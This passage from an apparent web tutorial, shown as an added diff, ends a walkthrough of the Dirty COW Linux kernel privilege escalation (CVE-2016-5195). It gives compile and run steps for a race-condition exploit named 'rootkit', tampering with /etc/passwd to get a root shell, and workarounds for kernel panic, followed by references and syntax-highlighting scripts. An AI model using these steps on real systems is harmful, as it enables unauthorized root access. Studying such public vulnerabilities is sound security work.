+// string to write
+#define CONTENT_STRING &quot;0000&quot;
+// byte offset of the starting location to write to 
+#define CONTENT_OFFSET 2999</code></pre></div>
+
+<p>Compile the file with:</p>
+
+<div><pre><code class="language-bash">$ gcc -o rootkit racing.c -lpthread</code></pre></div>
+
+<p>Before executing the program, make sure to read <strong>Kernel Panic Workaround</strong> section first as it is possible that your system might panic unless action is taken. When you are ready, execute the program:</p>
+
+<div><pre><code class="language-bash">$ ./rootkit</code></pre></div>
+
+<p>The program runs infinite loops and never finishes, therefore you have to kill it after a couple of seconds. I found three seconds to be sufficient to perform a dirty copy-on-write. Press <code>Ctrl+C</code> to terminate the program. Now you need to logout and login. You should be in a root shell now. Make sure to run</p>
+
+<div><pre><code class="language-bash">echo 0 &gt; /proc/sys/vm/dirty_writeback_centisecs</code></pre></div>
+
+<p>as soon as possible to avoid possible kernel panic.
+You have successfully gained root privileges to the system.</p>
+
+<h5 id="toc_11">Kernel Panic Workaround</h5>
+
+<p>Some machine exhibit kernel panic behavior when attempting the dirty copy-on-write exploit after modifying the <code>/etc/passwd</code>. There are currently two workarounds.</p>
+
+<p>After you log in as x, root shell will pop up. Make sure to enter the following line or the system will panic after a couple of seconds. It helps if you execute this line before you become root to save it in your shell command history buffer, then access it with the up arrow. You can also use the copy and paste if you are in the graphical user interface mode. However, it is possible to type and execute this command in the period of time before the kernel panic occurs.</p>
+
+<div><pre><code class="language-bash">echo 0 &gt; /proc/sys/vm/dirty_writeback_centisecs</code></pre></div>
+
+<p>–or–</p>
+
+<p>if you have access to the physical device, </p>
+
+<div><pre><code class="language-bash">passwd</code></pre></div>
+
+<p>and the shell will prompt you to enter a new root password. Change it to whatever you like but I would recommend something short. Remember to do this fairly swiftly as the kernel panic can happen any second. Shut the device off and turn it back on. After the device boots up, you can log in as root with your new root password.</p>
+
+<h3 id="toc_12">References</h3>
+
+<ul>
+<li><a href="https://access.redhat.com/security/cve/cve-2016-5195">https://access.redhat.com/security/cve/cve-2016-5195</a></li>
+<li><a href="https://www.linuxfoundation.org/blog/how-bad-is-dirty-cow/">https://www.linuxfoundation.org/blog/how-bad-is-dirty-cow/</a></li>
+<li><a href="https://access.redhat.com/security/vulnerabilities/DirtyCow">https://access.redhat.com/security/vulnerabilities/DirtyCow</a></li>
+<li><a href="https://dirtycow.ninja">https://dirtycow.ninja</a></li>
+<li><a href="https://www.v3.co.uk/v3-uk/news/2474845/linux-users-urged-to-protect-against-dirty-cow-security-flaw">https://www.v3.co.uk/v3-uk/news/2474845/linux-users-urged-to-protect-against-dirty-cow-security-flaw</a></li>
+<li><a href="https://arstechnica.com/information-technology/2016/10/android-phones-rooted-by-most-serious-linux-escalation-bug-ever/">https://arstechnica.com/information-technology/2016/10/android-phones-rooted-by-most-serious-linux-escalation-bug-ever/</a></li>
+<li><a href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=19be0eaffa3ac7d8eb6784ad9bdbc7d67ed8e619">https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=19be0eaffa3ac7d8eb6784ad9bdbc7d67ed8e619</a></li>
+<li><a href="https://arstechnica.com/information-technology/2016/10/most-serious-linux-privilege-escalation-bug-ever-is-under-active-exploit/">https://arstechnica.com/information-technology/2016/10/most-serious-linux-privilege-escalation-bug-ever-is-under-active-exploit/</a></li>
+<li><a href="https://developer.android.com/about/dashboards/index.html">https://developer.android.com/about/dashboards/index.html</a></li>
+<li><a href="http://blog.trendmicro.com/trendlabs-security-intelligence/zniu-first-android-malware-exploit-dirty-cow-vulnerability/">http://blog.trendmicro.com/trendlabs-security-intelligence/zniu-first-android-malware-exploit-dirty-cow-vulnerability/</a></li>
+<li><a href="https://www.youtube.com/watch?v=PCKhmPTDurg">https://www.youtube.com/watch?v=PCKhmPTDurg</a></li>
+</ul>
+
+
+
+<script type="text/javascript">
+var _self="undefined"!=typeof window?window:"undefined"!=typeof WorkerGlobalScope&&self instanceof WorkerGlobalScope?self:{},Prism=function(){var e=/\blang(?:uage)?-(\w+)\b/i,t=0,n=_self.Prism={util:{encode:function(e){return e instanceof a?new a(e.type,n.util.encode(e.content),e.alias):"Array"===n.util.type(e)?e.map(n.util.encode):e.replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/\u00a0/g," ")},type:function(e){return Object.prototype.toString.call(e).match(/\[object (\w+)\]/)[1]},objId:function(e){return e.__id||Object.defineProperty(e,"__id",{value:++t}),e.__id},clone:function(e){var t=n.util.type(e);switch(t){case"Object":var a={};for(var r in e)e.hasOwnProperty(r)&&(a[r]=n.util.clone(e[r]));return a;case"Array":return e.map&&e.map(function(e){return n.util.clone(e)})}return e}},languages:{extend:function(e,t){var a=n.util.clone(n.languages[e]);for(var r in t)a[r]=t[r];return a},insertBefore:function(e,t,a,r){r=r||n.languages;var l=r[e];if(2==arguments.length){a=arguments[1];for(var i in a)a.hasOwnProperty(i)&&(l[i]=a[i]);return l}var o={};for(var s in l)if(l.hasOwnProperty(s)){if(s==t)for(var i in a)a.hasOwnProperty(i)&&(o[i]=a[i]);o[s]=l[s]}return n.languages.DFS(n.languages,function(t,n){n===r[e]&&t!=e&&(this[t]=o)}),r[e]=o},DFS:function(e,t,a,r){r=r||{};for(var l in e)e.hasOwnProperty(l)&&(t.call(e,l,e[l],a||l),"Object"!==n.util.type(e[l])||r[n.util.objId(e[l])]?"Array"!==n.util.type(e[l])||r[n.util.objId(e[l])]||(r[n.util.objId(e[l])]=!0,n.languages.DFS(e[l],t,l,r)):(r[n.util.objId(e[l])]=!0,n.languages.DFS(e[l],t,null,r)))}},plugins:{},highlightAll:function(e,t){var a={callback:t,selector:'code[class*="language-"], [class*="language-"] code, code[class*="lang-"], [class*="lang-"] code'};n.hooks.run("before-highlightall",a);for(var r,l=a.elements||document.querySelectorAll(a.selector),i=0;r=l[i++];)n.highlightElement(r,e===!0,a.callback)},highlightElement:function(t,a,r){for(var l,i,o=t;o&&!e.test(o.className);)o=o.parentNode;o&&(l=(o.className.match(e)||[,""])[1],i=n.languages[l]),t.className=t.className.replace(e,"").replace(/\s+/g," ")+" language-"+l,o=t.parentNode,/pre/i.test(o.nodeName)&&(o.className=o.className.replace(e,"").replace(/\s+/g," ")+" language-"+l);var s=t.textContent,u={element:t,language:l,grammar:i,code:s};if(!s||!i)return n.hooks.run("complete",u),void 0;if(n.hooks.run("before-highlight",u),a&&_self.Worker){var c=new Worker(n.filename);c.onmessage=function(e){u.highlightedCode=e.data,n.hooks.run("before-insert",u),u.element.innerHTML=u.highlightedCode,r&&r.call(u.element),n.hooks.run("after-highlight",u),n.hooks.run("complete",u)},c.postMessage(JSON.stringify({language:u.language,code:u.code,immediateClose:!0}))}else u.highlightedCode=n.highlight(u.code,u.grammar,u.language),n.hooks.run("before-insert",u),u.element.innerHTML=u.highlightedCode,r&&r.call(t),n.hooks.run("after-highlight",u),n.hooks.run("complete",u)},highlight:function(e,t,r){var l=n.tokenize(e,t);return a.stringify(n.util.encode(l),r)},tokenize:function(e,t){var a=n.Token,r=[e],l=t.rest;if(l){for(var i in l)t[i]=l[i];delete t.rest}e:for(var i in t)if(t.hasOwnProperty(i)&&t[i]){var o=t[i];o="Array"===n.util.type(o)?o:[o];for(var s=0;s<o.length;++s){var u=o[s],c=u.inside,g=!!u.lookbehind,h=!!u.greedy,f=0,d=u.alias;u=u.pattern||u;for(var p=0;p<r.length;p++){var m=r[p];if(r.length>e.length)break e;if(!(m instanceof a)){u.lastIndex=0;var y=u.exec(m),v=1;if(!y&&h&&p!=r.length-1){var b=r[p+1].matchedStr||r[p+1],k=m+b;if(p<r.length-2&&(k+=r[p+2].matchedStr||r[p+2]),u.lastIndex=0,y=u.exec(k),!y)continue;var w=y.index+(g?y[1].length:0);if(w>=m.length)continue;var _=y.index+y[0].length,P=m.length+b.length;if(v=3,P>=_){if(r[p+1].greedy)continue;v=2,k=k.slice(0,P)}m=k}if(y){g&&(f=y[1].length);var w=y.index+f,y=y[0].slice(f),_=w+y.length,S=m.slice(0,w),O=m.slice(_),j=[p,v];S&&j.push(S);var A=new a(i,c?n.tokenize(y,c):y,d,y,h);j.push(A),O&&j.push(O),Array.prototype.splice.apply(r,j)}}}}}return r},hooks:{all:{},add:function(e,t){var a=n.hooks.all;a[e]=a[e]||[],a[e].push(t)},run:function(e,t){var a=n.hooks.all[e];if(a&&a.length)for(var r,l=0;r=a[l++];)r(t)}}},a=n.Token=function(e,t,n,a,r){this.type=e,this.content=t,this.alias=n,this.matchedStr=a||null,this.greedy=!!r};if(a.stringify=function(e,t,r){if("string"==typeof e)return e;if("Array"===n.util.type(e))return e.map(function(n){return a.stringify(n,t,e)}).join("");var l={type:e.type,content:a.stringify(e.content,t,r),tag:"span",classes:["token",e.type],attributes:{},language:t,parent:r};if("comment"==l.type&&(l.attributes.spellcheck="true"),e.alias){var i="Array"===n.util.type(e.alias)?e.alias:[e.alias];Array.prototype.push.apply(l.classes,i)}n.hooks.run("wrap",l);var o="";for(var s in l.attributes)o+=(o?" ":"")+s+'="'+(l.attributes[s]||"")+'"';return"<"+l.tag+' class="'+l.classes.join(" ")+'" '+o+">"+l.content+"</"+l.tag+">"},!_self.document)return _self.addEventListener?(_self.addEventListener("message",function(e){var t=JSON.parse(e.data),a=t.language,r=t.code,l=t.immediateClose;_self.postMessage(n.highlight(r,n.languages[a],a)),l&&_self.close()},!1),_self.Prism):_self.Prism;var r=document.currentScript||[].slice.call(document.getElementsByTagName("script")).pop();return r&&(n.filename=r.src,document.addEventListener&&!r.hasAttribute("data-manual")&&document.addEventListener("DOMContentLoaded",n.highlightAll)),_self.Prism}();"undefined"!=typeof module&&module.exports&&(module.exports=Prism),"undefined"!=typeof global&&(global.Prism=Prism);
+</script>
+
+<script type="text/javascript">
+!function(e){var t={variable:[{pattern:/\$?\(\([\w\W]+?\)\)/,inside:{variable:[{pattern:/(^\$\(\([\w\W]+)\)\)/,lookbehind:!0},/^\$\(\(/],number:/\b-?(?:0x[\dA-Fa-f]+|\d*\.?\d+(?:[Ee]-?\d+)?)\b/,operator:/--?|-=|\+\+?|\+=|!=?|~|\*\*?|\*=|\/=?|%=?|<<=?|>>=?|<=?|>=?|==?|&&?|&=|\^=?|\|\|?|\|=|\?|:/,punctuation:/\(\(?|\)\)?|,|;/}},{pattern:/\$\([^)]+\)|`[^`]+`/,inside:{variable:/^\$\(|^`|\)$|`$/}},/\$(?:[a-z0-9_#\?\*!@]+|\{[^}]+\})/i]};e.languages.bash={shebang:{pattern:/^#!\s*\/bin\/bash|^#!\s*\/bin\/sh/,alias:"important"},comment:{pattern:/(^|[^"{\\])#.*/,lookbehind:!0},string:[{pattern:/((?:^|[^<])<<\s*)(?:"|')?(\w+?)(?:"|')?\s*\r?\n(?:[\s\S])*?\r?\n\2/g,lookbehind:!0,inside:t},{pattern:/(["'])(?:\\\\|\\?[^\\])*?\1/g,inside:t}],variable:t.variable,"function":{pattern:/(^|\s|;|\||&)(?:alias|apropos|apt-get|aptitude|aspell|awk|basename|bash|bc|bg|builtin|bzip2|cal|cat|cd|cfdisk|chgrp|chmod|chown|chroot|chkconfig|cksum|clear|cmp|comm|command|cp|cron|crontab|csplit|cut|date|dc|dd|ddrescue|df|diff|diff3|dig|dir|dircolors|dirname|dirs|dmesg|du|egrep|eject|enable|env|ethtool|eval|exec|expand|expect|export|expr|fdformat|fdisk|fg|fgrep|file|find|fmt|fold|format|free|fsck|ftp|fuser|gawk|getopts|git|grep|groupadd|groupdel|groupmod|groups|gzip|hash|head|help|hg|history|hostname|htop|iconv|id|ifconfig|ifdown|ifup|import|install|jobs|join|kill|killall|less|link|ln|locate|logname|logout|look|lpc|lpr|lprint|lprintd|lprintq|lprm|ls|lsof|make|man|mkdir|mkfifo|mkisofs|mknod|more|most|mount|mtools|mtr|mv|mmv|nano|netstat|nice|nl|nohup|notify-send|nslookup|open|op|passwd|paste|pathchk|ping|pkill|popd|pr|printcap|printenv|printf|ps|pushd|pv|pwd|quota|quotacheck|quotactl|ram|rar|rcp|read|readarray|readonly|reboot|rename|renice|remsync|rev|rm|rmdir|rsync|screen|scp|sdiff|sed|seq|service|sftp|shift|shopt|shutdown|sleep|slocate|sort|source|split|ssh|stat|strace|su|sudo|sum|suspend|sync|tail|tar|tee|test|time|timeout|times|touch|top|traceroute|trap|tr|tsort|tty|type|ulimit|umask|umount|unalias|uname|unexpand|uniq|units|unrar|unshar|uptime|useradd|userdel|usermod|users|uuencode|uudecode|v|vdir|vi|vmstat|wait|watch|wc|wget|whereis|which|who|whoami|write|xargs|xdg-open|yes|zip)(?=$|\s|;|\||&)/,lookbehind:!0},keyword:{pattern:/(^|\s|;|\||&)(?:let|:|\.|if|then|else|elif|fi|for|break|continue|while|in|case|function|select|do|done|until|echo|exit|return|set|declare)(?=$|\s|;|\||&)/,lookbehind:!0},"boolean":{pattern:/(^|\s|;|\||&)(?:true|false)(?=$|\s|;|\||&)/,lookbehind:!0},operator:/&&?|\|\|?|==?|!=?|<<<?|>>|<=?|>=?|=~/,punctuation:/\$?\(\(?|\)\)?|\.\.|[{}[\];]/};var a=t.variable[1].inside;a["function"]=e.languages.bash["function"],a.keyword=e.languages.bash.keyword,a.boolean=e.languages.bash.boolean,a.operator=e.languages.bash.operator,a.punctuation=e.languages.bash.punctuation}(Prism);
+</script>
+
+<script type="text/javascript">
+Prism.languages.clike={comment:[{pattern:/(^|[^\\])\/\*[\w\W]*?\*\//,lookbehind:!0},{pattern:/(^|[^\\:])\/\/.*/,lookbehind:!0}],string:{pattern:/(["'])(\\(?:\r\n|[\s\S])|(?!\1)[^\\\r\n])*\1/,greedy:!0},"class-name":{pattern:/((?:\b(?:class|interface|extends|implements|trait|instanceof|new)\s+)|(?:catch\s+\())[a-z0-9_\.\\]+/i,lookbehind:!0,inside:{punctuation:/(\.|\\)/}},keyword:/\b(if|else|while|do|for|return|in|instanceof|function|new|try|throw|catch|finally|null|break|continue)\b/,"boolean":/\b(true|false)\b/,"function":/[a-z0-9_]+(?=\()/i,number:/\b-?(?:0x[\da-f]+|\d*\.?\d+(?:e[+-]?\d+)?)\b/i,operator:/--?|\+\+?|!=?=?|<=?|>=?|==?=?|&&?|\|\|?|\?|\*|\/|~|\^|%/,punctuation:/[{}[\];(),.:]/};
+</script>
+
+<script type="text/javascript">
+Prism.languages.c=Prism.languages.extend("clike",{keyword:/\b(asm|typeof|inline|auto|break|case|char|const|continue|default|do|double|else|enum|extern|float|for|goto|if|int|long|register|return|short|signed|sizeof|static|struct|switch|typedef|union|unsigned|void|volatile|while)\b/,operator:/\-[>-]?|\+\+?|!=?|<<?=?|>>?=?|==?|&&?|\|?\||[~^%?*\/]/,number:/\b-?(?:0x[\da-f]+|\d*\.?\d+(?:e[+-]?\d+)?)[ful]*\b/i}),Prism.languages.insertBefore("c","string",{macro:{pattern:/(^\s*)#\s*[a-z]+([^\r\n\\]|\\.|\\(?:\r\n?|\n))*/im,lookbehind:!0,alias:"property",inside:{string:{pattern:/(#\s*include\s*)(<.+?>|("|')(\\?.)+?\3)/,lookbehind:!0},directive:{pattern:/(#\s*)\b(define|elif|else|endif|error|ifdef|ifndef|if|import|include|line|pragma|undef|using)\b/,lookbehind:!0,alias:"keyword"}}},constant:/\b(__FILE__|__LINE__|__DATE__|__TIME__|__TIMESTAMP__|__func__|EOF|NULL|stdin|stdout|stderr)\b/}),delete Prism.languages.c["class-name"],delete Prism.languages.c["boolean"];
+</script>
+
+
+</body>
+
+</html>
